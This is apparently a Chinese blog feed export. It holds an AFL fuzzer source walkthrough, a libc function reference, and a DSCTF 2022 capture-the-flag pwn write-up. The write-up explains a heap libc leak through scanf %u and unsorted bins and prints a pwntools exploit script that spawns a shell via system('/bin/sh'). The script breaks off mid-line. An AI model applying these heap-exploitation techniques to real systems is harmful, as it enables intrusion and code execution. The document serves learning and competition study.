EP_ModuleOptimizerEarly - This extension point allows adding passes</span><br>    <span class="hljs-comment">/// just before the main module-level optimization passes.</span><br>    EP_ModuleOptimizerEarly,<br>    ...<br>    <span class="hljs-comment">/// EP_EnabledOnOptLevel0 - This extension point allows adding passes that</span><br>    <span class="hljs-comment">/// should not be disabled by O0 optimization level. The passes will be</span><br>    <span class="hljs-comment">/// inserted after the inlining pass.</span><br>    EP_EnabledOnOptLevel0,<br>    ...<br>    &#125;<br>    ...<br>    ...<br>  <span class="hljs-comment">/// Adds an extension that will be used by all PassManagerBuilder instances.</span><br>  <span class="hljs-comment">/// This is intended to be used by plugins, to register a set of</span><br>  <span class="hljs-comment">/// optimisations to run automatically.</span><br>  <span class="hljs-comment">///</span><br>  <span class="hljs-comment">/// \returns A global extension identifier that can be used to remove the</span><br>  <span class="hljs-comment">/// extension.</span><br>  <span class="hljs-function"><span class="hljs-keyword">static</span> GlobalExtensionID <span class="hljs-title">addGlobalExtension</span><span class="hljs-params">(ExtensionPointTy Ty,</span></span><br><span class="hljs-params"><span class="hljs-function">                                              ExtensionFn Fn)</span></span>;<br>    ...<br>  &#125;<br>...<br>...<br><span class="hljs-comment">/// PassManagerBase - An abstract interface to allow code to add passes to</span><br><span class="hljs-comment">/// a pass manager without having to hard-code what kind of pass manager</span><br><span class="hljs-comment">/// it is.</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PassManagerBase</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">PassManagerBase</span>();<br><br>  <span class="hljs-comment">/// Add a pass to the queue of passes to run.  This passes ownership of</span><br>  <span class="hljs-comment">/// the Pass to the PassManager.  When the PassManager is destroyed, the pass</span><br>  <span class="hljs-comment">/// will be destroyed as well, so there is no need to delete the pass.  This</span><br>  <span class="hljs-comment">/// may even destroy the pass right away if it is found to be redundant. This</span><br>  <span class="hljs-comment">/// implies that all passes MUST be allocated with &#x27;new&#x27;.</span><br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(Pass *P)</span> </span>= <span class="hljs-number">0</span>;<br>&#125;;<br></code></pre></td></tr></table></figure>

<h4 id="runOnModule"><a href="#runOnModule" class="headerlink" title="runOnModule"></a>runOnModule</h4><ul>
<li><p>首先定义了一个继承自 ModulePass 的 AFLCoverage 类。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">The ModulePass <span class="hljs-keyword">class</span> <span class="hljs-keyword">is</span> the most general <span class="hljs-keyword">of</span> <span class="hljs-keyword">all</span> superclasses that you can use. Deriving <span class="hljs-keyword">from</span> ModulePass indicates that your pass uses the entire program <span class="hljs-keyword">as</span> a unit, referring <span class="hljs-keyword">to</span> <span class="hljs-keyword">function</span> bodies <span class="hljs-keyword">in</span> <span class="hljs-keyword">no</span> predictable <span class="hljs-keyword">order</span>, <span class="hljs-keyword">or</span> adding <span class="hljs-keyword">and</span> removing <span class="hljs-keyword">functions</span>.<br>ModulePass类是所有可使用的超类中最通用的。从ModulePass派生指示您的pass将整个程序作为一个单元，以不可预测的顺序引用函数体，或者添加和删除函数。<br></code></pre></td></tr></table></figure>

<p>因此选择继承不同类型的 Pass 父类就是从不同的粒度对程序进行处理。这里选择继承 ModulePass 就是对整个程序都进行处理。</p>
</li>
<li><p>然后在类外，对类中的静态成员变量 ID 进行定义及初始化。该变量是 pass 标识符，即 LLVM 用于唯一标识 pass 。同时，在类外定义 runOnModule() 函数，该函数内容便是实现真正需求的部分。</p>
</li>
<li><p>通过 getContext 来获取 LLVMContext，其保存了整个程序里分配的类型和常量信息。</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">This is an important class for using <span class="hljs-keyword">LLVM </span>in a threaded <span class="hljs-built_in">context</span>. It (opaquely) owns <span class="hljs-keyword">and </span>manages the core “global” data of <span class="hljs-keyword">LLVM’s </span>core infrastructure, including the type <span class="hljs-keyword">and </span>constant uniquing tables.<br><span class="hljs-keyword">LLVMContext </span>itself provides no locking guarantees, so you <span class="hljs-keyword">should </span><span class="hljs-keyword">be </span>careful to have one <span class="hljs-built_in">context</span> per thread.<br>这是在线程上下文中使用 <span class="hljs-keyword">LLVM </span>的一个重要类。它(不透明地)拥有和管理<span class="hljs-keyword">LLVM核心基础设施的核心“全局”数据，包括类型和常量唯一表。</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">LLVMContext </span>本身不提供锁定保证，因此您应该小心为每个线程提供一个上下文。<br></code></pre></td></tr></table></figure></li>
<li><p>通过 LLVMContext 来获取 type 实例 Int8Ty 和 Int32Ty：</p>
<ul>
<li>Type 是所有 type 类的一个超类（父类）。<strong>每个 Value 都有一个 Type</strong>，所以这经常被用于寻找指定类型的 Value。Type 不能直接实例化，只能通过其子类实例化。某些基本类型(VoidType、LabelType、FloatType 和 DoubleType)有隐藏的子类。之所以隐藏它们，是因为除了 Type 类提供的功能之外，它们没有提供任何有用的功能，除了将它们与Type 的其他子类区分开来之外。所有其他类型都是 DerivedType 的子类。Types 可以被命名，但这不是必需的。一个给定 Type 在任何时候都只存在一个实例。这允许使用 Type 实例的地址相等来执行 type 相等。也就是说，给定两个 Type* 值，如果指针相同，则 types 相同。</li>
</ul>
</li>
<li><p>读取环境变量 AFL_INST_RATIO，并且将其赋值给变量 inst_ratio_str，如果有值，则将其值赋给 inst_ratio，如果没有值则 inst_ratio 默认值为 100，这个值代表一个插桩概率，如果为 100 则表示每个分支都必定插桩，如果有了变化，就可以决定是否要在这个分支插桩。</p>
</li>
<li><p>定义两个全局变量：</p>
<ul>
<li><p>AFLMapPtr 是一个用来指向共享内存映射到进程空间的地址；AFLPreLoc 是一个用来表示前一个基本块的编号。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml">关于GlobalVariable的构造函数官方介绍如下：<br><span class="hljs-constructor">GlobalVariable(<span class="hljs-params">const</span> Type <span class="hljs-operator">*</span>Ty, <span class="hljs-params">bool</span> <span class="hljs-params">isConstant</span>, LinkageTypes &amp;Linkage, Constant Initializer = 0, <span class="hljs-params">const</span> <span class="hljs-params">std</span>::<span class="hljs-params">string</span> &amp;Name = “”, Module Parent = 0)</span><br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>遍历每个基本块，获取其第一条指令的迭代器，使用获取到的迭代器创建一个 IRBuilder 类的实例，通过该实例就能很方便地创建一些指令，并插在插入点。</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver">IRBuilder is used <span class="hljs-keyword">as</span> <span class="hljs-keyword">a</span> convenient way <span class="hljs-built_in">to</span> <span class="hljs-built_in">create</span> LLVM instruvtions <span class="hljs-keyword">with</span> <span class="hljs-keyword">a</span> consistent <span class="hljs-keyword">and</span> simplified interface. And <span class="hljs-keyword">then</span> insert them <span class="hljs-keyword">into</span> <span class="hljs-keyword">a</span> basic block.<br>IRBuilder 是一种创建 LLVM 指令的方便方法，具有一致和简化的接口。然后把它们插入一个基本块。<br></code></pre></td></tr></table></figure></li>
<li><p>取 0~MAP_SIZE 之间的一个值作为当前基本块的编号。</p>
</li>
<li><p>```<br>在 LLVM 中，无论是全局变量还是局部变量都是指针类型的，所以需要使用 CreatedLoad() 方法来获取值，CreatedStore() 方法来赋值，Load 和 Store 就是一对访问内存的指令。然后使用 CreateZExt 来完成相应的类型转换。Value 类是其他众多重要类的超类，如 Instruction 和 Function。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">-</span> 通过 CreatedLoad() 方法获取上一个基本块的编号并转换成相应类型，Metadata 可以看作是一种调试信息。<br><br><span class="hljs-bullet">-</span> 获取指向共享内存区域的指针。并通过 CreateGEP 方法获取共享内存里指定 index 的指针，而 index 是通过当前基本块的编号和上一个基本块的编号异或计算得到的。<br><br><span class="hljs-bullet">-</span> 用 CreateLoad() 方法将 index 地址处的值取出赋值给 Counter。<br><br><span class="hljs-bullet">-</span> 将 Counter 值加一后，再将值存入 index 地址处。<br><br><span class="hljs-bullet">-</span> 将当前基本块的编号右移一位并赋值给 AFLPreLoc，即更新<span class="hljs-code">`__afl_prev_loc`</span>的值。<br><br></code></pre></td></tr></table></figure>
<p>之所以要将当前基础块编号右移一位，是因为当基础块跳转A-&gt;A和B-&gt;B，或A-&gt;B和B-&gt;A，它们的编号做异或后的结果是相同的，无法区分，所以其中一个编号要右移一位。</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-bullet">- </span>总的来说就是通过遍历每个基本块，向其中插入实现了如下伪代码功能的 instruction ir 来进行插桩：<br><br></code></pre></td></tr></table></figure>
<p>cur_location = <COMPILE_TIME_RANDOM>;<br>shared_mem[cur_location ^ prev_location]++;<br>prev_location = cur_location &gt;&gt; 1;</COMPILE_TIME_RANDOM></p>
<figure class="highlight clean"><table><tr><td class="code"><pre><code class="hljs clean"><br>- 作用：<br><br>  - 当有控制流到达当前基础块时，其共享内存对应位置，用于计数的值就会加一<br>  - 而AFL可以根据该共享内存上的数据来判断控制流的覆盖程度，调整输入样本，使控制流能够覆盖更多的基础块<br><br>### afl-llvm-rt.o.c<br><br><br><br><br><br>## afl-fuzz<br><br>### 初始配置<br><br>#### while循环<br><br>```c<br>while ((opt = getopt(argc, argv, <span class="hljs-string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="hljs-number">0</span>)<br>    	...<br></code></pre></td></tr></table></figure></li>
</ul>
<p>刚开始使用<code>getopt</code>函数获取输入的选项参数。</p>
<h4 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h4><p>先了解一下常见的信号：</p>
<table>
<thead>
<tr>
<th align="center">信号名称</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">SIGALRM</td>
<td align="left">由alarm函数设置的定时器产生</td>
</tr>
<tr>
<td align="center">SIGHUP</td>
<td align="left">由一个处于非连接状态的终端发送给控制进程，或者由控制进程在自身结束时发送给每个前台进程</td>
</tr>
<tr>
<td align="center">SIGINT</td>
<td align="left">一般由从终端敲入的Crtl+C组合键或预先设置好的中断字符产生</td>
</tr>
<tr>
<td align="center">SIGKILL</td>
<td align="left">shell中使用其来强制终止异常进程</td>
</tr>
<tr>
<td align="center">SIGPIPE</td>
<td align="left">如果向管道写数据时没有与之对应的读进程，就会产生这个信号</td>
</tr>
<tr>
<td align="center">SIGTERM</td>
<td align="left">作为一个请求被发送，要求进程结束运行。UNIX关机时用这个信号要求系统服务停止运行。它是kill命令默认发送的信号</td>
</tr>
<tr>
<td align="center">SIGUSR1，SIGUSR2</td>
<td align="left">进程之间可以用这个信号进行通信，例如让进程报告状态信息等</td>
</tr>
</tbody></table>
<h4 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h4><h4 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h4><h3 id="fuzz执行"><a href="#fuzz执行" class="headerlink" title="fuzz执行"></a>fuzz执行</h3><h3 id="变异策略"><a href="#变异策略" class="headerlink" title="变异策略"></a>变异策略</h3><h4 id="memset-sakura-array"><a href="#memset-sakura-array" class="headerlink" title="memset_sakura_array"></a>memset_sakura_array</h4><p>初始化了两个数组：<code>simplify_lookup</code>和<code>count_class_lookup8</code>。</p>
<h2 id="库函数"><a href="#库函数" class="headerlink" title="库函数"></a>库函数</h2><ul>
<li><p>getenv() </p>
<ul>
<li><code>char *getenv(const char *name)</code> 搜索 name 所指向的环境变量，并返回一个以 null 结尾的字符串，该字符串为被请求的环境变量的值。如果该环境变量不存在，则返回 NULL。</li>
</ul>
</li>
<li><p>setenv()</p>
<ul>
<li><code>int setenv(const char *name, const char *value, int overwrite);</code> 先检查 overwrite 是否为 0 ，如果不为 0 ，则将 name 指向的环境变量的值替换为 *value ，如果为 0 ，且 name 指向的环境变量存在，则会忽略 *value</li>
</ul>
</li>
<li><p>access()</p>
<ul>
<li><code>int access(const char *pathname, int mode)</code>判断指定的文件或目录是否存在(F_OK)，已存在的文件或目录是否有可读(R_OK)、可写(W_OK)、可执行(X_OK)权限。F_OK、R_OK、W_OK、X_OK这四种方式通过access函数中的第二个参数mode指定。如果指定的方式有效，则此函数返回0，否则返回-1。</li>
</ul>
</li>
<li><p>gettimeofday()</p>
<ul>
<li><p><code>int gettimeofday (struct timeval * tv, struct timezone * tz)</code>gettimeofday()会把目前的时间放到 tv 所指的结构，当地时区的信息则放到 tz 所指的结构中。</p>
</li>
<li><pre><code>timeval 结构定义为：
struct timeval&#123;
    long tv_sec;  //秒
    long tv_usec;  //微秒
&#125;;

timezone 结构定义为：
struct timezone
&#123;
    int tz_minuteswest;  //和Greenwich 时间差了多少分钟
    int tz_dsttime;  //日光节约时间的状态
&#125;;
</code></pre>
</li>
</ul>
</li>
<li><p>srandom()</p>
<ul>
<li>生产随机数需要种子（Seed），且如果种子固定，random()每次运行生成的随机数（其实是伪随机数）也是固定的；因为返回的随机数是根据稳定的算法得出的稳定结果序列，并且Seed就是这个算法开始计算的第一个值。</li>
<li>srandom()可以设定种子，比如srandom(0) 、srandom(1)等等，没设置时默认为种子为1。如果srandom设定了一个固定的种子，那么random得出的随机数就是固定的。</li>
<li> 如果程序运行时通过srandom(time(NULL))设定种子为随机的，那么random()每次生成的随机数就是非固定的。</li>
</ul>
</li>
<li><p>getopt()</p>
<ul>
<li><p><code>int getopt(int argc, char *const argv[], const char *optstring)</code>getopt()用来分析命令行参数。</p>
</li>
<li><p>参数argc 和argv 是由main()传递的参数个数和内容。</p>
</li>
<li><p>参数optstring 则代表欲处理的选项字符串。</p>
</li>
<li><p>此函数会返回在argv 中下一个的选项字母，此字母是对应参数optstring 中的字母。</p>
</li>
<li><p>如果选项字符串里的字母后接着一个冒号”:”，则表示必须有相关的参数，如果字母后接两个冒号”::”，则表示相关参数是可选的，相关参数的首地址赋给全局变量optarg。</p>
</li>
<li><p>返回值：如果找到符合的参数则返回此参数字母, 如果参数不包含在参数optstring 的选项字母则返回”?”字符,分析结束则返回-1.</p>
</li>
</ul>
</li>
<li><p>memcpy()</p>
<ul>
<li><code>void *memcpy(void *str1, const void *str2, size_t n)</code> 从存储区 <strong>str2</strong> 复制 <strong>n</strong> 个字节到存储区 <strong>str1</strong>。</li>
<li>该函数返回一个指向目标存储区 str1 的指针。</li>
</ul>
</li>
<li><p>strchr()</p>
<ul>
<li> <code>char *strchr(const char *str, int c)</code> 在参数 <strong>str</strong> 所指向的字符串中搜索第一次出现字符 <strong>c</strong>（一个无符号字符）的位置。</li>
<li> 该函数返回在字符串 str 中第一次出现字符 c 的位置，如果未找到该字符则返回 NULL。</li>
</ul>
</li>
<li><p>strrchr()</p>
<ul>
<li> <code>char *strrchr(const char *str, int c)</code> 在参数 <strong>str</strong> 所指向的字符串中搜索最后一次出现字符 <strong>c</strong>（一个无符号字符）的位置。</li>
<li>该函数返回 str 中最后一次出现字符 c 的位置。如果未找到该值，则函数返回一个空指针。</li>
</ul>
</li>
<li><p>strstr()</p>
<ul>
<li><code>char *strstr(const char *haystack, const char *needle)</code>在字符串 <strong>haystack</strong> 中查找第一次出现字符串 <strong>needle</strong> 的位置，不包含终止符 ‘\0’。</li>
<li>该函数返回在 haystack 中第一次出现 needle 字符串的位置，如果未找到则返回 null。</li>
</ul>
</li>
<li><p>sscanf()</p>
<ul>
<li><code>int sscanf(const char *str, const char *format, ...)</code> 从字符串读取格式化输入到填入的参数（…省略的是参数）里。</li>
<li>如果成功，该函数返回成功匹配和赋值的个数。如果到达文件末尾或发生读错误，则返回 EOF。</li>
</ul>
</li>
<li><p>open()</p>
<ul>
<li><code>int open(const char * pathname, int flags)</code> 打开一个文件。</li>
<li>下列为常见的flag取值：<ul>
<li>参数 pathname 指向欲打开文件的路径字符串， flag为打开的模式。</li>
<li>O_RDONLY 以只读方式打开文件。</li>
<li>O_WRONLY 以只写方式打开文件。</li>
<li>O_RDWR 以可读写方式打开文件。上述三种旗标是互斥的，不可同时使用。</li>
<li>O_CREAT 若欲打开的文件不存在则自动建立该文件。</li>
<li>O_SYNC 以同步的方式打开文件。</li>
</ul>
</li>
</ul>
</li>
<li><p>sigemptyset()</p>
<ul>
<li><code>int sigemptyset(sigset_t *set)</code>该函数的作用是将信号集初始化为空。</li>
</ul>
</li>
<li><p>kill()</p>
<ul>
<li><code>int kill(pid_t pid, int sig)</code>kill()可以用来送参数 sig 指定的信号给参数 pid 指定的进程。</li>
<li>成功时返回0，调用失败返回-1。</li>
<li>pid 说明：<ul>
<li>pid&gt;0 将信号传给进程识别码为 pid 的进程。</li>
<li>pid=0 将信号传给和目前进程相同进程组的所有进程。</li>
<li>pid=-1 将信号广播传送给系统内所有的进程。</li>
<li>pid&lt;0 将信号传给进程组识别码为 pid 绝对值的所有进程参数 sig 代表的信号编号。</li>
</ul>
</li>
</ul>
</li>
<li><p>alarm()</p>
<ul>
<li><code>unsigned int alarm(unsigned int seconds)</code>alarm() 函数用来在 seconds 秒之后安排发送一个 SIGALRM 信号，如果 seconds 为 0，将取消所有已设置的闹钟请求。</li>
<li>alarm() 函数的返回值是，设置的闹钟时间的余留秒数，如果失败返回 -1。</li>
</ul>
</li>
<li><p>fdopen()</p>
<ul>
<li><code>int fdopen(int handle,char* type);</code>将流与文件句柄连接</li>
<li>返回指向该流的文件指针</li>
</ul>
</li>
<li><p>fgets()</p>
<ul>
<li><code>char *fgets(char *str, int n, FILE *stream)</code>从指定的流 stream 读取一行，并把它存储在 <strong>str</strong> 所指向的字符串内。当读取 <strong>(n-1)</strong> 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</li>
<li>如果成功，该函数返回相同的 str 参数；如果到达文件末尾或者没有读取到任何字符，str 的内容保持不变，并返回一个空指针；如果发生错误，返回一个空指针。</li>
</ul>
</li>
<li><p>fputs()</p>
<ul>
<li><code>int fputs(const char *str, FILE *stream)</code>把字符串写入到指定的流 stream 中，但不包括空字符。</li>
<li>该函数返回一个非负值，如果发生错误则返回 EOF。</li>
</ul>
</li>
<li><p>isalpha()</p>
<ul>
<li><code>int isalpha(int c);</code>检查所传的字符是否是字母。</li>
<li>如果 c 是一个字母，则该函数返回非零值，否则返回 0。</li>
</ul>
</li>
<li><p>isdigit()</p>
<ul>
<li><code>int isdigit(int c);</code>检查所传的字符是否是十进制数字字符。</li>
<li>如果 c 是一个数字，则该函数返回非零值，否则返回 0。</li>
</ul>
</li>
<li><p>fork()</p>
<ul>
<li><code>pid_t fork(void)</code>会进行系统调用，用于创建一个新进程，称为子进程，它与进程同时运行，此进程称为父进程。在创建新的子进程后，两个进程将执行 fork() 之后的下一条指令。</li>
<li>返回值： 若成功调用一次则返回两个值，子进程返回 0，父进程返回子进程 ID；否则，出错返回 -1。</li>
</ul>
</li>
<li><p>waitpid()</p>
<ul>
<li><code>pid_t waitpid(pid_t pid,int *status,int options);</code>当指定等待的子进程已经停止运行或结束了，则waitpid() 会立即返回；但是如果子进程还没有停止运行或结束，则调用 waitpid() 函数的父进程则会被阻塞，暂停运行。</li>
<li>waitpid() 函数执行成功，则返回子进程的进程号；如果有错误发生，则返回-1，并且将失败的状态赋值给 status。</li>
</ul>
</li>
<li><p>shmat()</p>
<ul>
<li><code>void *shmat(int shmid, const void *shmaddr, int shmflg)</code>用来启动对共享内存的访问，并把共享内存连接到当前进程的地址空间。</li>
<li>第一个参数，shm_id 是由 shmget() 函数返回的共享内存标识。</li>
<li>第二个参数，shm_addr 指定共享内存连接到当前进程中的地址位置，通常为空，表示让系统来选择共享内存的地址。</li>
<li>第三个参数，shm_flg 是一组标志位，通常为 0。</li>
<li>调用成功时返回一个指向共享内存第一个字节的指针，如果调用失败返回-1.</li>
</ul>
</li>
<li><p>isatty()</p>
<ul>
<li><code> int isatty(int handle);</code>检查文件描述符指向的设备类型是普通文件，还是设备文件。</li>
<li>普通文件返回 0，设备返回 -1。</li>
<li>常见设备文件：<ul>
<li>stdin  标准输入设备 键盘</li>
<li>stdout 标准输出设备 显示器 </li>
<li>stderr 标准错误设备</li>
<li>stdaux 辅助设备</li>
<li>stdprn 打印机</li>
</ul>
</li>
</ul>
</li>
<li><p>sscanf()</p>
<ul>
<li><code>int sscanf(const char *str, const char *format, ...)</code>从字符串 str 读取输入给 format。</li>
<li>如果成功，该函数返回成功匹配和赋值的个数。如果到达文件末尾或发生读错误，则返回 EOF。</li>
</ul>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://eternalsakura13.com/2020/08/23/afl/#comments">https://eternalsakura13.com/2020/08/23/afl/#comments</a></p>
<p><a href="https://paper.seebug.org/1732/#_1">https://paper.seebug.org/1732/#_1</a></p>
<p><a href="https://blog.csdn.net/qq_38081870/article/details/106600627">https://blog.csdn.net/qq_38081870/article/details/106600627</a></p>
]]></content>
      <tags>
        <tag>AFL</tag>
      </tags>
  </entry>
  <entry>
    <title>2022DSCTF</title>
    <url>/2022/07/19/2022-07-19-DSCTF/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>惨遭爆零，还好被师傅们带飞进入决赛，EDI yyds</p>
<p>总共有四题PWN，但是有一题零解，就无法在下面复现了，能力有限。</p>
<h1 id="fuzzerinstrospector"><a href="#fuzzerinstrospector" class="headerlink" title="fuzzerinstrospector"></a>fuzzerinstrospector</h1><p>程序里面已经给了gift函数，也就是说只要泄露出libc即可，所以这题的关键点在于如何进行泄露。这里的泄露挺巧，在自己做的时候确实是怎么都没想到竟然是这样做的。</p>
<p><img src="/2022/07/19/2022-07-19-DSCTF/image-20220719182814054.png"><span class="image-caption">image-20220719182814054</span></p>
<p>泄露函数可以打印 <code>堆地址 + 堆fd指针上单字节内容 + 8</code>上的内容。因为是要泄露地址，整个程序除了这里可以打印，其他地方都是无法打印内容的，所以问题一定是处在这里。这里巧的地方就在于，假设我们在<code>堆地址 + 8</code>也就是<code>bk指针</code>开始按顺序填入0x00~0xFF，那么再加上<code>堆地址 + 堆fd指针上单字节内容 + 8</code>所指向的内容其实就是<code>堆fd指针上单字节内容</code>，相当于绕了一个弯再打印出来。</p>
<p><img src="/2022/07/19/2022-07-19-DSCTF/image-20220719183000965.png"><span class="image-caption">image-20220719183000965</span></p>
<p>这题的另一个点在于scanf这个函数，当参数是%u的时候，只能读取十进制数的，遇到字符就会直接判断为读取结束，而不会再进行读取，所以只要输入一个字符，八次循环一次都无法读入内容，从而把fd指针上的内容保存下来。</p>
<p><img src="/2022/07/19/2022-07-19-DSCTF/image-20220719183611413.png"><span class="image-caption">image-20220719183611413</span></p>
<p>其他不过就是构造出一个 unsorted bin，总共可以申请九个堆块，还是比较容易构造出的。</p>
<p><img src="/2022/07/19/2022-07-19-DSCTF/image-20220719184136832.png"><span class="image-caption">image-20220719184136832</span></p>
<p>gdb调试结果是一致的，所以可以借此把libc地址泄露出来。</p>
<p><img src="/2022/07/19/2022-07-19-DSCTF/image-20220719184537665.png"><span class="image-caption">image-20220719184537665</span></p>
<p><img src="/2022/07/19/2022-07-19-DSCTF/image-20220719184630235.png"><span class="image-caption">image-20220719184630235</span></p>
<p>最后就是传入system的地址，把/bin/sh写入堆里，完成！</p>
<p><img src="/2022/07/19/2022-07-19-DSCTF/image-20220719184019436.png"><span class="image-caption">image-20220719184019436</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pickletools <span class="hljs-keyword">import</span> bytes1<br><span class="hljs-keyword">from</span> turtle <span class="hljs-keyword">import</span> bye<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./fuzzerinstrospector&#x27;</span>)<br>DEBUG = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)<br>    ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ld-2.27.so&quot;</span>)<br>    p = process(argv=[ld.path,elf.path], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;39.105.185.193&#x27;</span><br>    port = <span class="hljs-number">30007</span><br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p, <span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        p.recvuntil(<span class="hljs-string">f&quot;Index: <span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>        p.sendline(<span class="hljs-string">&#x27;255&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Bitmap: &quot;</span>)<br>    p.send(content)<br>	<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br>    shell = [<span class="hljs-string">&#x27;47&#x27;</span>,<span class="hljs-string">&#x27;98&#x27;</span>,<span class="hljs-string">&#x27;105&#x27;</span>,<span class="hljs-string">&#x27;110&#x27;</span>,<span class="hljs-string">&#x27;47&#x27;</span>,<span class="hljs-string">&#x27;115&#x27;</span>,<span class="hljs-string">&#x27;104&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        p.recvuntil(<span class="hljs-string">f&quot;Index: <span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>        p.sendline(shell[i])<br>    p.recvuntil(<span class="hljs-string">b&quot;Bitmap: &quot;</span>)<br>    p.send(content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;Bitmap set: \n&quot;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exec</span>(<span class="hljs-params">addr</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice: &quot;</span>, <span class="hljs-string">b&#x27;6&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(addr).encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    free(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>)<br>free(<span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>,-<span class="hljs-number">1</span>,-<span 